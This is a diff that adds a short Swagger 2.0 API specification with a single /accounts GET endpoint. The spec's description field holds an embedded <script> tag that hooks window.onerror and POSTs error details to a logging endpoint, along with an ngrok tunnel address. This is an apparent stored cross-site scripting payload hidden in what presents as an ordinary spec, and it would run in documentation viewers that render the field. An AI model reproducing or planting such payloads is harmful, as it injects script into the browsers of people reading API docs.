@@ -1,1 +1,15 @@
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description: <script>window.onerror=(m,s,l,c,e)=>fetch('/log-error',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:m,source:s,lineno:l,colno:c,error:e,ip:'af41-2402-4000-2200-ef63-e04e-307d-d019-44d.ngrok-free.app'})}).catch(error=>console.error('Error logging:',error));</script>
 
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
